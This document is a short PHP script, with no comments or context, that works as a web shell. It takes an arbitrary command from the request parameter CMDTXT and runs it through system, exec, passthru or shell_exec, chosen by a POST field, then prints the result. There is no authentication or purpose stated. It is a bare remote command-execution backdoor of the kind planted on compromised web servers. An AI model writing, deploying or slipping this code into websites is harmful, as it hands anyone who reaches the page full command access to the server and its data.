<?php
$cmdCommand = @$_REQUEST['CMDTXT'];
$Item = @$_POST['CMDSelect'];
switch ($Item)
{
case 'system' :
	print system($cmdCommand);
	break;
case 'exec' :
	print exec($cmdCommand);
	break;
case 'passthru' :
	print passthru($cmdCommand);
	break;
case 'shell_exec' :
	print shell_exec($cmdCommand);
	break;
}

?>